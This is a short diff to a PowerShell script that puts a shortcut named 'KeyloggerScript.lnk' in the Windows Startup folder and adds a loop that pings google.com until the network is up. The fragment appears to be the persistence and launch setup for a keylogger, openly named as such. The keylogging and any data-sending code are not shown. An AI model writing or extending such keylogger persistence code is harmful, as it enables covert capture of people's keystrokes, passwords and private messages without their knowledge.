@@ -4,6 +4,18 @@ $startupFolderPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\
 # Define the path for the shortcut
 $shortcutPath = [System.IO.Path]::Combine($startupFolderPath, 'KeyloggerScript.lnk')
 
+# Function to check for an active network connection
+function Test-NetworkConnection {
+    $pingResult = Test-Connection -ComputerName google.com -Count 1 -Quiet
+    return $pingResult
+}
+
+# Wait for an active network connection
+while (-Not (Test-NetworkConnection)) {
+    Write-Output "Waiting for network connection..."
+    Start-Sleep -Seconds 5
+}
+
 # Check if the shortcut exists
 if (Test-Path $shortcutPath) {
     Write-Output "Shortcut exists at $shortcutPath"
